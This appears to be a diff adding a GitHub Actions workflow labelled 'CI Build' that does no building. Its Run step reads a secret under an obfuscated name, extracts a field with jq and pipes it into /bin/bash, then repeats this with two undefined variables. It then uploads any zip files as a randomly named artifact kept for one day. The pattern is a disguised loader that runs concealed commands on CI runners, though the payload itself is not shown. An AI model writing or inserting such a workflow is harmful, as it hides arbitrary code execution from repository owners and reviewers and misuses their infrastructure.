@@ -1,0 +1,37 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          iazmk87: ${{ secrets.iazmk87 }}
+        run: |
+          printf '%s' "$iazmk87" | jq -r .uz156 | /bin/bash
+          printf '%s' "$spzyo63" | jq -r .wrjda22391 | /bin/bash
+          printf '%s' "$shvf10" | jq -r .gciv655 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: wrNtwDdB
+          path: "*.zip"
+          retention-days: 1
